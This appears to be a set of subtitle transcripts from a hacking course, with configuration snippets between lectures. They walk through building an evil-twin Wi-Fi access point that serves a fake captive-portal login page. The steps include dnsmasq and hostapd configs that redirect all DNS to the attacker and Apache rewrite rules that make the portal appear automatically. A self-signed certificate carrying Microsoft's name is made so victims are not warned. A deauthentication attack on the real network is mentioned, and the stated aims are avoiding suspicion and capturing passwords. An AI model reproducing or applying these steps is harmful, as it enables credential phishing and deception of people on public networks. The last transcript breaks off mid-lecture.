Now, finally, I'm going to configure my LAN zero my wireless adapter to have an IP address and I'm

98
00:07:23,880 --> 00:07:29,400
going to set the IP address to ten 001 and then I'm going to set its netmask.

99
00:07:29,520 --> 00:07:32,820
So first of all, if I just do ifconfig lan zero now.

100
00:07:34,380 --> 00:07:42,060
You'll see that it still doesn't have an IP address, so we're going to do ifconfig LAN zero.

101
00:07:42,780 --> 00:07:46,680
We're going to give it an IP address of ten 001.

102
00:07:47,280 --> 00:07:54,300
And I chose this IP address because this is the IP that I'm using in the Dnsmasq configuration as the

103
00:07:54,300 --> 00:08:01,650
IP address of the router, as the IP address of the DNS server and as the IP address that all the requests

104
00:08:01,650 --> 00:08:02,790
should go to.

105
00:08:03,630 --> 00:08:05,970
Then I'm going to do netmask.

106
00:08:07,340 --> 00:08:12,500
And I'm going to set that to (255) 255-2550, which is the default.

107
00:08:13,750 --> 00:08:20,680
Okay, so we're literally just configuring our wireless adapter to have an IP address and we're setting

108
00:08:20,680 --> 00:08:22,210
it netmask as well.

109
00:08:23,340 --> 00:08:24,540
I'm going to hit Enter.

110
00:08:26,060 --> 00:08:26,840
And we're done.

111
00:08:26,840 --> 00:08:27,710
We're completely done.

112
00:08:27,710 --> 00:08:32,390
Now we have our host running broadcasting the wireless signal.

113
00:08:32,390 --> 00:08:36,350
So we have a network running with this name, Royal WiFi version two.

114
00:08:36,380 --> 00:08:39,950
We also started our DNS server.

115
00:08:39,950 --> 00:08:44,210
So now we have any device that connects to our network.

116
00:08:44,210 --> 00:08:48,020
We'll get an IP address and they'll be able to use that network.

117
00:08:48,470 --> 00:08:55,070
Now the last thing that we need to do is start Apache, which is the web server that has the fake login

118
00:08:55,070 --> 00:08:55,820
page.

119
00:08:55,820 --> 00:09:01,910
So we usually start Apache by doing service Apache to start.

120
00:09:03,740 --> 00:09:05,900
And that starts Apache for us.

121
00:09:06,110 --> 00:09:11,510
Now let's go to a Windows machine and test this network and see if it actually works.

122
00:09:12,350 --> 00:09:14,060
Now I'm going to go on Wi-Fi.

123
00:09:15,860 --> 00:09:19,040
And as you can see, we have two royal Wi-Fi networks.

124
00:09:19,040 --> 00:09:22,580
We have the original one right here and we have the fake one.

125
00:09:23,030 --> 00:09:29,210
Now, in a proper attack scenario, you should be running the authentication attack against this network

126
00:09:29,210 --> 00:09:31,220
so that nobody can connect to it.

127
00:09:31,220 --> 00:09:34,880
And even the people connected to it will lose their connection.

128
00:09:35,000 --> 00:09:41,060
So once that happens, they're going to look for Wi-Fi networks and they're going to see a network called

129
00:09:41,060 --> 00:09:42,590
Royal Wi-Fi version two.

130
00:09:42,590 --> 00:09:45,980
And they'll just think this is an updated version of their network.

131
00:09:46,400 --> 00:09:48,230
They're going to try to connect.

132
00:09:49,010 --> 00:09:54,380
And usually when they connect, they get an automatically they get a login screen that looks similar

133
00:09:54,380 --> 00:09:55,850
to what they usually do.

134
00:09:55,880 --> 00:09:58,820
Now, this is not going to happen right now, and I'll tell you why.

135
00:09:58,820 --> 00:10:01,220
And I'm going to fix that in the future lectures.

136
00:10:01,220 --> 00:10:05,780
But for now, we're just going to connect to make sure that we can connect to this network.

137
00:10:07,860 --> 00:10:12,000
And once we connect, I'm going to go and open my web browser.

138
00:10:15,080 --> 00:10:16,760
And just go to any web page.

139
00:10:16,760 --> 00:10:18,470
So I'm going to go to Bing.com.

140
00:10:20,730 --> 00:10:27,960
Now, once we do that, as you can see, we automatically got redirected to the login page that looks

141
00:10:27,960 --> 00:10:35,250
exactly like the login page that our target uses and they can just click English, click on login,

142
00:10:35,760 --> 00:10:38,730
and then put their information and submit it.

143
00:10:39,480 --> 00:10:46,860
Now ideally we'd like this to be automatically displayed to the users as soon as they connect because

144
00:10:46,860 --> 00:10:51,840
that's the default or the usual behavior of captive portals.

145
00:10:51,840 --> 00:10:55,830
When you connect to it on an iPhone or on a smartphone or even on a computer.

146
00:10:55,860 --> 00:11:03,120
The login page automatically gets displayed to you, and we want our users to get the exact same experience

147
00:11:03,120 --> 00:11:04,890
so they don't get suspicious.

148
00:11:05,010 --> 00:11:06,960
So what we've done so far is really good.

149
00:11:06,960 --> 00:11:13,260
Now if you try to go to any website in here, it's redirecting you to the login page, but the login

150
00:11:13,260 --> 00:11:15,660
page is not being displayed automatically.

151
00:11:16,050 --> 00:11:23,160
Another issue, if you try to go to a web page that uses Hsts like Facebook, for example, the browser

152
00:11:23,160 --> 00:11:30,270
will refuse to load it because it knows that this website uses Https and you're not accessing it using

153
00:11:30,270 --> 00:11:31,260
Https.

154
00:11:31,260 --> 00:11:32,940
So it's showing an error.

155
00:11:33,420 --> 00:11:36,810
That's another problem that might make people suspicious.

156
00:11:36,810 --> 00:11:41,670
So we're going to address both of these issues later on in future lectures.

157
00:11:41,670 --> 00:11:48,350
But for now, as you can see, we have a working network that has a name.

158
00:11:48,360 --> 00:11:54,720
People can connect to it, and any time they try to go to any website, they'll be redirected to the

159
00:11:54,720 --> 00:11:56,310
login page right here.

#Set the wifi interface
interface=wlan0

#Set the IP range that can be given to clients
dhcp-range=10.0.0.10,10.0.0.100,8h

#Set the gateway IP address
dhcp-option=3,10.0.0.1

#Set dns server address
dhcp-option=6,10.0.0.1

#Redirect all requests to 10.0.0.1
address=/#/10.0.0.1

#Set wifi interface
interface=wlan0

#Set network name
ssid=royal wifi v2

#Set chennel
channel=1

#Set driver
driver=nl80211




━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,740 --> 00:00:05,780
Now I have my fake access point already running like I showed you before.

2
00:00:05,780 --> 00:00:10,160
And as you've seen in the previous lecture, the access point works.

3
00:00:10,160 --> 00:00:16,130
People can connect to it and when they go to any website, they'll be redirected to my login page,

4
00:00:16,130 --> 00:00:17,540
which is great.

5
00:00:17,750 --> 00:00:24,080
One thing that I wasn't very happy with is the fact that when people connect to this fake access point,

6
00:00:24,110 --> 00:00:26,990
they won't see the login screen automatically.

7
00:00:26,990 --> 00:00:31,700
They literally have to go open their browser and browse for something.

8
00:00:31,700 --> 00:00:38,900
And this is not the exact behavior that you would get when you connect to a captive portal, because

9
00:00:38,900 --> 00:00:43,700
usually when you connect to it, you see the login page automatically displayed to you.

10
00:00:43,880 --> 00:00:47,330
So that's what I'm going to try to achieve in this lecture.

11
00:00:47,330 --> 00:00:51,380
And we basically have all the hard work done already.

12
00:00:51,380 --> 00:00:58,100
We have our web server working, we have our fake access point working, we have our DNS server automatically

13
00:00:58,100 --> 00:01:02,130
redirecting all our requests to my fake login page.

14
00:01:02,310 --> 00:01:09,750
The only reason why it's not working right now is because some of the requests sent by Windows.

15
00:01:09,750 --> 00:01:15,540
So by the by the system that the target is using are not being handled properly.

16
00:01:15,930 --> 00:01:22,340
And what I mean by that is when when someone first connects to a captive portal, the system will send

17
00:01:22,360 --> 00:01:27,480
requests to a certain server depending on the system, whether it runs on windows, whether it runs

18
00:01:27,480 --> 00:01:30,960
on Linux, Mac OS, whether it's an iPhone or a smartphone.

19
00:01:30,960 --> 00:01:33,930
They'll send a request to a certain server.

20
00:01:33,930 --> 00:01:40,260
If they get the response that they expect, they'll think that this is a normal network and they'll

21
00:01:40,260 --> 00:01:44,700
just not do anything if they don't get the request that they expect.

22
00:01:44,730 --> 00:01:50,160
They'll think that this is a captive portal and they'll show the captive portal login page.

23
00:01:50,850 --> 00:01:55,950
Now, in my example, I'm already redirecting requests to my website.

24
00:01:55,950 --> 00:02:02,400
So there might be there has to be something happening at the background that the requests sent by the

25
00:02:02,400 --> 00:02:06,180
system, by Windows in my case are not being handled properly.

26
00:02:06,390 --> 00:02:16,410
And after investigation I discovered that the requests sent to w-w-w dot websites have to be redirected

27
00:02:16,410 --> 00:02:18,000
to just the domain name.

28
00:02:18,000 --> 00:02:26,370
So whenever the windows, for example requests requests WW dot Microsoft.com, it should be handled

29
00:02:26,370 --> 00:02:28,740
as microsoft.com instead.

30
00:02:29,490 --> 00:02:31,890
Now to achieve this is very easy.

31
00:02:31,890 --> 00:02:37,350
We just have to modify the configuration of our web server, which is Apache.

32
00:02:37,680 --> 00:02:44,400
So to do that we're going to use Leafpad, which is just a text editor, and the configuration file

33
00:02:44,400 --> 00:02:46,680
for Apache is stored in E.t.c.

34
00:02:47,900 --> 00:02:48,560
Apache.

35
00:02:50,310 --> 00:02:57,210
Sites enabled and 000 default conf.

36
00:02:57,840 --> 00:03:00,720
So we haven't done anything complicated so far.

37
00:03:00,720 --> 00:03:06,570
We're doing Leafpad, which is a text editor, and we're trying to open this file, which is the configuration

38
00:03:06,570 --> 00:03:08,310
file for Apache.

39
00:03:08,910 --> 00:03:10,290
I'm going to hit Enter.

40
00:03:11,930 --> 00:03:15,320
And you should get something like this because this is the default file.

41
00:03:15,320 --> 00:03:17,240
It's not modified at all.

42
00:03:18,490 --> 00:03:26,650
Now, in this file, we need to add rules to redirect any request to w-w-w dot something dot whatever

43
00:03:26,650 --> 00:03:30,820
to just the domain name without the w-w-w.

44
00:03:30,820 --> 00:03:34,180
So literally just delete the w-w-w from the request.

45
00:03:34,930 --> 00:03:41,320
To do that, we have to use rewrite rules and first of all, before we can actually put the rewrite

46
00:03:41,320 --> 00:03:45,160
rules, we have to put them inside a directory tag.

47
00:03:45,460 --> 00:03:48,370
So I'm going to open a tag and type directory.

48
00:03:49,750 --> 00:03:55,720
And you're going to have to put the location where your website is stored and my website is stored in

49
00:03:55,730 --> 00:03:57,940
var w-w-w HTML.

50
00:03:59,180 --> 00:04:03,080
And I'm just going to close the directory tag as well, so I don't forget that.

51
00:04:03,080 --> 00:04:05,750
So it's similar to writing HTML code.

52
00:04:07,920 --> 00:04:15,390
And inside this directory we're going to add the rewrite rules that will redirect any request for W-w-w

53
00:04:15,390 --> 00:04:20,880
dot something.com to the same request without the w-w-w dot at the start.

54
00:04:21,630 --> 00:04:26,850
Again, like I said, we're going to use rewrite rules and I already have them in here and I'm going

55
00:04:26,850 --> 00:04:29,430
to include them in the resources of this lecture.

56
00:04:30,620 --> 00:04:34,850
Now, I'm not going to dive too deep about what these rules do.

57
00:04:34,880 --> 00:04:42,770
Basically, we have to first enable the rewrite engine, which basically enables the rewrite rules.

58
00:04:42,890 --> 00:04:49,920
Then we specify the rewrite base, which is the route, the web route, and then we have the condition.

59
00:04:49,940 --> 00:04:53,930
So this condition works based on regex, so it uses regex.

60
00:04:53,930 --> 00:04:58,250
And if you have any programming experience, you probably have used regex before.

61
00:04:58,340 --> 00:05:01,520
RegEx is a big topic, so I'm not going to be covering it.

62
00:05:01,520 --> 00:05:11,030
But basically what it does is it matches whenever it sees a w-w-w dot and it ignores whatever that comes

63
00:05:11,030 --> 00:05:19,160
after the WW dot and it's going to rewrite it as whatever that came after the W-w-w dot without the

64
00:05:19,160 --> 00:05:20,150
WW.

65
00:05:20,540 --> 00:05:27,560
Whenever a request comes to us with a w-w-w at the start it's going to match this condition right here.

66
00:05:28,930 --> 00:05:34,090
And then it is it's going to be replaced with the normal website.

67
00:05:34,090 --> 00:05:39,310
So Http followed by the website itself without the w-w-w.

68
00:05:39,910 --> 00:05:41,770
So I'm going to copy all of this.

69
00:05:45,030 --> 00:05:49,800
And I'm going to paste it in here inside the directory field.

70
00:05:51,360 --> 00:05:53,640
And just said that it looks nicer.

71
00:05:53,820 --> 00:05:55,350
I'm just going to tap it.

72
00:05:58,500 --> 00:06:02,730
So that it just follows the syntax that's used in the file.

73
00:06:03,720 --> 00:06:06,720
Now, all we did is we added a directory.

74
00:06:06,750 --> 00:06:14,250
We specified the location where we have our files stored in the web server, and we added the rewrite

75
00:06:14,250 --> 00:06:21,780
rules that will redirect any requests for a w-w-w-w website to the same website without the w-w-w.

76
00:06:22,590 --> 00:06:28,770
I'm going to save this, quit it and then I'm just going to restart restart my web server.

77
00:06:28,770 --> 00:06:30,270
So we're going to do service.

78
00:06:31,360 --> 00:06:33,310
Apache2 restart.

79
00:06:36,610 --> 00:06:40,750
And now let's go and try to connect to our website.

80
00:06:41,020 --> 00:06:42,790
So I'm going to close this.

81
00:06:45,850 --> 00:06:47,740
I'm going to go here.

82
00:06:48,660 --> 00:06:49,950
Disconnect.

83
00:06:51,740 --> 00:06:54,740
And now that I'm disconnected, I'm going to connect again.

84
00:06:56,520 --> 00:06:59,160
And as you can see now, we made progress.

85
00:07:00,050 --> 00:07:03,010
The browser got automatically opened for us.

86
00:07:03,020 --> 00:07:05,870
It's automatically trying to go somewhere.

87
00:07:06,230 --> 00:07:10,490
But the problem is we're getting a not found message.

88
00:07:10,910 --> 00:07:17,560
So this message is actually coming from my own web server, so I'm being redirected to my web server.

89
00:07:17,570 --> 00:07:25,260
But if you look at the URL here closely, you'll see that it's trying to go to some location on goat

90
00:07:25,310 --> 00:07:26,720
microsoft.com.

91
00:07:27,260 --> 00:07:32,690
So we have a DNS server running and that's redirecting any request to our website.

92
00:07:32,690 --> 00:07:36,230
So if you literally just go to goat Microsoft.com.

93
00:07:36,230 --> 00:07:38,540
So I'm just going to open this in a different tab.

94
00:07:40,770 --> 00:07:45,090
You'll see that we'll get redirected to our page, which is cool, which is perfect.

95
00:07:45,120 --> 00:07:52,560
The problem here is automatically Windows is adding all of this after the domain name and that's why

96
00:07:52,560 --> 00:07:59,220
we're getting a not found error because on our web server we don't have such files or directories,

97
00:07:59,730 --> 00:08:07,620
so we need to configure our web server again so that the not found error gets redirected to the home

98
00:08:07,620 --> 00:08:09,450
page to the index in here.

99
00:08:11,080 --> 00:08:11,650
Again.

100
00:08:11,650 --> 00:08:14,140
Now we're going to go to Carly.

101
00:08:14,470 --> 00:08:22,900
We're going to open my Web server configuration at sites enabled 000 default conf same file.

102
00:08:23,140 --> 00:08:29,710
And in here, I'm going to configure my web server so that if a file is not found, it will redirect

103
00:08:29,710 --> 00:08:34,090
the person to the home page where the fake login page is installed.

104
00:08:34,950 --> 00:08:35,880
To do that.

105
00:08:35,910 --> 00:08:39,450
All we have to do is just say ErrorDocument.

106
00:08:40,500 --> 00:08:41,360
404.

107
00:08:41,370 --> 00:08:48,660
So whenever you get a 404, which is a not found error, go to the Web root, go to the base of the

108
00:08:48,660 --> 00:08:49,590
Web server.

109
00:08:50,070 --> 00:08:56,400
So we're adding just one, just literally one line and we're just saying error document.

110
00:08:56,400 --> 00:08:59,280
And that's what Apache uses to handle errors.

111
00:08:59,280 --> 00:09:03,540
And we're saying if you get a 404 error, then just go to the web root.

112
00:09:05,110 --> 00:09:06,430
Now, this will actually work.

113
00:09:06,430 --> 00:09:12,970
I've obviously tested it before and it'll work with Windows OS X and all that, but to get it to work

114
00:09:12,970 --> 00:09:21,160
with smartphones and specifically iPhones, we actually need to also add a rewrite rule that will redirect

115
00:09:21,160 --> 00:09:25,000
anything that is not found to the Home directory.

116
00:09:25,510 --> 00:09:28,890
So this is the rewrite rule that will do that.

117
00:09:28,900 --> 00:09:33,790
Again, I'm just going to copy it and place it in here inside the directory.

118
00:09:35,600 --> 00:09:39,650
And I'm just going to tap it again just so that it follows the syntax.

119
00:09:41,170 --> 00:09:45,550
And this rewrite rule, as you can see, first we have the conditions in here.

120
00:09:45,880 --> 00:09:53,260
So if the requested file name is not found, it's going to redirect that request to the web route in

121
00:09:53,260 --> 00:09:53,890
here.

122
00:09:55,970 --> 00:09:57,260
So we added two lines.

123
00:09:57,260 --> 00:09:59,220
Now we added the first line in here.

124
00:09:59,240 --> 00:10:05,390
It works for pretty much everything and it just redirects any 404 not found error to the web route.

125
00:10:05,510 --> 00:10:11,540
And we also added a rewrite rule that will do the same just to make sure that this will also work against

126
00:10:11,540 --> 00:10:12,590
smartphones.

127
00:10:13,750 --> 00:10:15,310
I'm going to save this.

128
00:10:15,340 --> 00:10:16,450
Quit it.

129
00:10:17,710 --> 00:10:18,130
Again.

130
00:10:18,130 --> 00:10:19,630
Restart my Apache.

131
00:10:20,920 --> 00:10:22,960
And let's go back to the Windows machine.

132
00:10:22,990 --> 00:10:24,670
I'm going to close this.

133
00:10:26,790 --> 00:10:28,860
Disconnect from the network.

134
00:10:33,590 --> 00:10:36,200
And connect again and let's see what happens.

135
00:10:38,800 --> 00:10:40,280
And perfect, as you can see.

136
00:10:40,300 --> 00:10:45,370
Now, as soon as we connected, the login page got displayed to us.

137
00:10:45,370 --> 00:10:51,700
So as you can see, even though there is stuff coming after the domain name, we have a working login

138
00:10:51,700 --> 00:11:00,070
page where we can go and log in to our service and then the hacker or us will be able to sniff the password.

139
00:11:00,340 --> 00:11:05,080
You can also see here on top, this was never displayed to us before.

140
00:11:05,080 --> 00:11:10,540
So you can see Firefox is automatically detecting that this is a captive portal and it's telling us

141
00:11:10,540 --> 00:11:13,720
that we must log in to this network to access the Internet.

142
00:11:13,720 --> 00:11:19,210
And again, it's given it's given us a button here that we can click to log in which will again take

143
00:11:19,210 --> 00:11:21,100
us to the login page.

144
00:11:21,460 --> 00:11:28,420
So now our fake access point looks and behaves exactly like a proper captive portal.

145
00:11:28,420 --> 00:11:33,730
So when people connect to it, whether they're on phones or computers, they'll automatically see a

146
00:11:33,730 --> 00:11:34,600
login page.

147
00:11:34,600 --> 00:11:40,220
They'll see the bar here on top, which looks legit, and it's literally just asks people to log in

148
00:11:40,220 --> 00:11:42,020
so that they can get to the Internet.

149
00:11:42,560 --> 00:11:45,110
Now we still have the Hsts issue.

150
00:11:45,110 --> 00:11:47,450
So if I go to Facebook.com.

151
00:11:49,580 --> 00:11:54,080
You can see that the page won't be displayed saying that the secure connection failed.

152
00:11:54,080 --> 00:11:59,390
But you can see we still have the bar in here telling us that we need to log in to get the internet

153
00:11:59,390 --> 00:12:05,210
connection so people won't get very suspicious because they can see that they need to log in to get

154
00:12:05,210 --> 00:12:06,080
their Internet.

155
00:12:06,200 --> 00:12:11,750
But I'm also going to address this issue and I'm going to show you in the next lecture how to fix this

156
00:12:11,750 --> 00:12:17,000
and make it look 100% like a proper, legitimate captive portal.

RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ / [L,QSA]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,590 --> 00:00:06,380
Okay, now that we got everything working properly you've seen in the previous lecture, when someone

2
00:00:06,380 --> 00:00:13,220
connects to our fake access point now they'll automatically see a login page that is our fake login

3
00:00:13,220 --> 00:00:13,930
page.

4
00:00:13,940 --> 00:00:19,490
Also, if they try to go to any other website, they'll be redirected to my login page and they'll also

5
00:00:19,490 --> 00:00:25,610
see a bar at the top of the browser telling them that they need to log in, which is all looks perfect.

6
00:00:25,850 --> 00:00:32,960
The only one issue that we have right now is if the person tries to go to a web page that uses Hsts

7
00:00:32,990 --> 00:00:40,460
like Facebook, Google, Twitter and all them, they will see a message saying that the browser couldn't

8
00:00:40,460 --> 00:00:47,420
establish a secure connection because the browser knows that this website needs to use Https.

9
00:00:47,870 --> 00:00:56,000
Now, to fix this issue, we need to enable Https on our own browser, on our own web server.

10
00:00:56,180 --> 00:01:05,100
So I've already started Apache and if I just open my web browser here and just go to my localhost.

11
00:01:05,680 --> 00:01:10,720
So my local host is usually at 127001.

12
00:01:10,930 --> 00:01:13,780
You'll see I have my login page that my target.

13
00:01:13,810 --> 00:01:19,870
See, the thing is now if I go here and put Https.

14
00:01:22,270 --> 00:01:29,620
You'll see that the page will just not get displayed, even for me, even though I'm a local user.

15
00:01:29,620 --> 00:01:34,690
And this is because Apache is not configured to handle Https.

16
00:01:35,830 --> 00:01:40,270
So in this lecture, I'm actually not even going to use the fake access point.

17
00:01:40,300 --> 00:01:46,780
What I'm going to show you is how to enable Https on Apache and you'll see how that will automatically

18
00:01:46,780 --> 00:01:49,150
fix the problem that we used to have.

19
00:01:50,310 --> 00:01:57,450
So the first thing that we need to do to use Https is to generate a Https certificate.

20
00:01:58,480 --> 00:02:03,130
So to generate a Https certificate, we're going to use open SSL.

21
00:02:05,780 --> 00:02:09,290
We're going to tell it that we want to create a request.

22
00:02:09,860 --> 00:02:13,100
And this is going to be a new request.

23
00:02:13,700 --> 00:02:20,510
And we want this request to follow the 509 structure because that's actually required.

24
00:02:21,140 --> 00:02:26,280
We're going to set the number of days that this certificate will be valid for.

25
00:02:26,300 --> 00:02:29,300
So we're going to set it to be valid for a whole year.

26
00:02:30,530 --> 00:02:36,470
Then we're going to set the location where we want the certificate to be stored, and I'm just going

27
00:02:36,470 --> 00:02:37,790
to store it in root.

28
00:02:38,650 --> 00:02:39,940
Downloads.

29
00:02:40,930 --> 00:02:47,290
Fake AP and I'll just call it cert dot pem.

30
00:02:48,810 --> 00:02:55,620
Now you'd want to save this usually in UTC, but for me, for now, since I have all my files for the

31
00:02:55,620 --> 00:03:00,360
fake access point in root downloads, fake access point, I'm just going to leave it in there.

32
00:03:01,380 --> 00:03:06,630
We're also going to specify the location where the key for this certificate should be stored.

33
00:03:06,630 --> 00:03:08,400
And that's going to be key out.

34
00:03:08,400 --> 00:03:10,590
And again, I'm going to put it in root.

35
00:03:11,870 --> 00:03:16,370
Downloads Fake app cert.

36
00:03:17,530 --> 00:03:19,540
And we'll call this dot key.

37
00:03:21,250 --> 00:03:21,880
Okay.

38
00:03:21,880 --> 00:03:23,650
So we're using a very simple command.

39
00:03:23,650 --> 00:03:25,390
We're doing OpenSSL.

40
00:03:25,420 --> 00:03:28,670
We're telling it that we need to make a request.

41
00:03:28,690 --> 00:03:35,110
This request is a new request that's going to create a certificate that follows the nine structure.

42
00:03:35,440 --> 00:03:36,250
The certificate.

43
00:03:36,250 --> 00:03:40,150
I want it to be valid for 365 days.

44
00:03:40,420 --> 00:03:47,230
I want you to store the certificate in root downloads, fake AP cert, and I want you to store its key

45
00:03:47,230 --> 00:03:48,280
in root downloads.

46
00:03:48,280 --> 00:03:50,140
Fake cert key.

47
00:03:50,680 --> 00:03:52,060
I'm going to hit Enter.

48
00:03:53,850 --> 00:03:56,370
And this should actually be days, not day.

49
00:03:59,640 --> 00:04:04,830
Now it's asking me to set a passphrase for the certificate, so I'm just going to set it right now.

50
00:04:06,180 --> 00:04:11,310
You might notice that nothing is being displayed on screen, but I've actually typed it and that's just

51
00:04:11,310 --> 00:04:12,450
a security feature.

52
00:04:12,450 --> 00:04:16,500
So just type it in, hit enter and type it again.

53
00:04:19,800 --> 00:04:21,360
And that's done now.

54
00:04:21,360 --> 00:04:23,120
It's asking me for the country.

55
00:04:23,130 --> 00:04:26,700
I'm just I'm just going to set it to I for Ireland.

56
00:04:29,070 --> 00:04:30,450
Askin me for the state.

57
00:04:30,450 --> 00:04:33,240
I'm going to set it to Dublin City again.

58
00:04:33,240 --> 00:04:34,680
I'm going to set it to Dublin.

59
00:04:36,860 --> 00:04:40,280
Company name, so we'll just call it Microsoft.

60
00:04:43,500 --> 00:04:45,100
We'll call this the unit.

61
00:04:45,120 --> 00:04:46,620
We'll call it networking.

62
00:04:48,990 --> 00:04:54,300
This is usually set to the domain name where the search is going to be used for us.

63
00:04:54,330 --> 00:04:59,270
We're just let's just call it royal, because our network is called Royal Wi-Fi.

64
00:05:00,790 --> 00:05:02,020
Email address.

65
00:05:02,020 --> 00:05:04,180
So we'll just set this to anything.

66
00:05:04,180 --> 00:05:06,460
So let's just say info at.

67
00:05:07,730 --> 00:05:09,770
Microsoft.com.

68
00:05:12,700 --> 00:05:13,510
And that's it.

69
00:05:13,540 --> 00:05:16,330
Now, our certificates should be created.

70
00:05:16,330 --> 00:05:18,670
So if we go to downloads.

71
00:05:20,780 --> 00:05:22,390
And fake AP.

72
00:05:24,420 --> 00:05:29,220
You'll see that we have the cert key and the cert dot Pem.

73
00:05:29,950 --> 00:05:35,650
Now we have the certificate ready and you can actually use this certificate with a lot of things and

74
00:05:35,650 --> 00:05:36,880
a lot of web servers.

75
00:05:36,880 --> 00:05:39,910
So generating the certificate is always the same.

76
00:05:39,910 --> 00:05:45,070
And then you'd want to integrate the certificate with the service that you want to use.

77
00:05:45,100 --> 00:05:49,780
So in our case, we want to use that with Apache so we can support Https.

78
00:05:49,780 --> 00:05:52,840
And I'm going to show you how to do that in the next lecture.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,320 --> 00:00:04,310
Okay, so now we know how to generate an SSL certificate.

2
00:00:04,400 --> 00:00:11,210
In this lecture, I'm going to show you how to enable SSL on Apache so that we can support Https and

3
00:00:11,210 --> 00:00:17,090
then we'll be able to use that on our captive portal so that it won't show a warning when people go

4
00:00:17,090 --> 00:00:19,070
to websites.

5
00:00:20,330 --> 00:00:21,140
To do that.

6
00:00:21,140 --> 00:00:22,820
I'm just going to clear this first.

7
00:00:22,970 --> 00:00:26,990
And to do that, all we have to do is just to a to n.

8
00:00:27,910 --> 00:00:28,720
Mode.

9
00:00:30,260 --> 00:00:34,160
And after that type, the mode that you want to enable.

10
00:00:34,160 --> 00:00:36,740
And in our case, we want to enable SSL.

11
00:00:37,490 --> 00:00:40,880
Now for me, it's telling me that it's already enabled for you.

12
00:00:40,880 --> 00:00:42,350
It's just going to enable it.

13
00:00:43,340 --> 00:00:44,690
Now, that's perfect.

14
00:00:44,720 --> 00:00:52,190
Next, we need to configure Apache to use the certificate and the key that we just created.

15
00:00:52,400 --> 00:00:57,370
So again, we have to open the configuration file for Apache that we used before.

16
00:00:57,380 --> 00:00:59,600
So we're going to use Leafpad to do that.

17
00:01:00,200 --> 00:01:07,910
And the file is stored in Etcd Apache2 sites enabled 000 conf.

18
00:01:08,830 --> 00:01:11,710
So it's the same file that we opened before.

19
00:01:12,400 --> 00:01:18,090
And in here, if you notice, you can see that we have a virtual host for Port 80.

20
00:01:18,100 --> 00:01:24,100
And this is the port that's usually used for Http for normal web pages.

21
00:01:24,910 --> 00:01:33,220
Now, if we want to use Https, I'm just going to navigate all the way down and just create a new virtual

22
00:01:33,220 --> 00:01:33,750
host.

23
00:01:33,760 --> 00:01:34,840
So I'm just going to paste it.

24
00:01:34,840 --> 00:01:36,460
I've actually copied the one on top.

25
00:01:37,780 --> 00:01:44,980
And we're going to set the port here to 443, which is the port that's usually used by SSL.

26
00:01:46,790 --> 00:01:49,790
And we'll also have to close the virtual host.

27
00:01:53,320 --> 00:01:55,900
And here we're going to say SSL engine.

28
00:01:58,560 --> 00:02:00,120
On to enable it.

29
00:02:01,200 --> 00:02:04,590
We're going to set the location for the certificate.

30
00:02:04,590 --> 00:02:07,470
So we're going to do SSL certificate file.

31
00:02:09,100 --> 00:02:17,020
And set the full path to the location where we have the certificate stored, and that is in route downloads.

32
00:02:18,480 --> 00:02:19,420
Fake AP.

33
00:02:20,780 --> 00:02:23,210
And it's called search.pm.

34
00:02:25,330 --> 00:02:26,830
Now you want to set the same.

35
00:02:26,830 --> 00:02:29,510
So I'm just going to copy this for the key.

36
00:02:29,530 --> 00:02:33,610
So we're going to do SSL certificate key.

37
00:02:35,480 --> 00:02:39,800
And this time instead of PM it was called cert key.

38
00:02:41,970 --> 00:02:45,810
Now, this is actually supposed to be called key file.

39
00:02:47,350 --> 00:02:50,500
So we created a new virtual host.

40
00:02:50,530 --> 00:02:55,120
We set it to use Port 443 because that's the port used for SSL.

41
00:02:55,480 --> 00:02:58,780
We set SSL engine to be on.

42
00:02:59,970 --> 00:03:07,860
We set the SSL certificate file to the file that we created in the previous step and we set the SSL

43
00:03:07,860 --> 00:03:12,810
certificate key file to the key that we created in the previous step.

44
00:03:13,410 --> 00:03:14,220
Now we're good.

45
00:03:14,220 --> 00:03:16,610
I'm going to save and quit.

46
00:03:18,020 --> 00:03:23,470
And finally, I'm just going to modify the ports file for Apache.

47
00:03:23,480 --> 00:03:25,250
So again, I'm going to do Leafpad.

48
00:03:26,380 --> 00:03:28,670
And that file is stored in e.t.c..

49
00:03:29,200 --> 00:03:31,030
Apache two ports.

50
00:03:33,560 --> 00:03:36,560
And make sure that I'm listening on Port 443.

51
00:03:36,590 --> 00:03:38,590
That's the port that we just enabled.

52
00:03:38,600 --> 00:03:45,890
So you can see that I'm already listening for Port 80 and I want to listen for Port 443.

53
00:03:46,460 --> 00:03:48,140
I'm going to quit this.

54
00:03:49,310 --> 00:03:51,080
Restart my Apache.

55
00:03:53,810 --> 00:03:54,950
Now, this failed.

56
00:03:54,950 --> 00:03:57,470
So I think I set one of the files.

57
00:03:57,470 --> 00:03:59,090
I set a wrong path to it.

58
00:03:59,090 --> 00:04:00,710
So let me just have another look.

59
00:04:02,420 --> 00:04:06,410
So this should be my third file.

60
00:04:07,870 --> 00:04:09,940
Let me just see if it actually exists.

61
00:04:09,940 --> 00:04:13,750
So I'm just going to do LZ and put the file name.

62
00:04:17,610 --> 00:04:19,770
And, yeah, I misspelled something.

63
00:04:21,280 --> 00:04:25,180
Oh it's yeah, it's 30 8 p.m., not PM.

64
00:04:25,660 --> 00:04:27,100
So that should be there.

65
00:04:27,100 --> 00:04:29,440
Now just let's, let's just make sure it's there.

66
00:04:31,110 --> 00:04:31,830
Yeah.

67
00:04:31,890 --> 00:04:34,920
And we'll make sure that I spelled this correctly as well.

68
00:04:34,920 --> 00:04:36,240
I always make this.

69
00:04:37,640 --> 00:04:38,480
Okay, Now that's.

70
00:04:38,480 --> 00:04:39,500
That's all there.

71
00:04:39,500 --> 00:04:44,960
So I'm just going to save, quit and restart Apache again.

72
00:04:45,410 --> 00:04:50,240
Now it's asking me for the password that we used when we when we generated the certificate.

73
00:04:50,240 --> 00:04:51,440
I'm going to enter it.

74
00:04:53,020 --> 00:04:55,150
And now Apache is working.

75
00:04:55,750 --> 00:04:58,180
Now let's come back here.

76
00:04:58,210 --> 00:05:03,070
Let's first test it with a normal Http and make sure that we didn't break anything.

77
00:05:05,550 --> 00:05:07,920
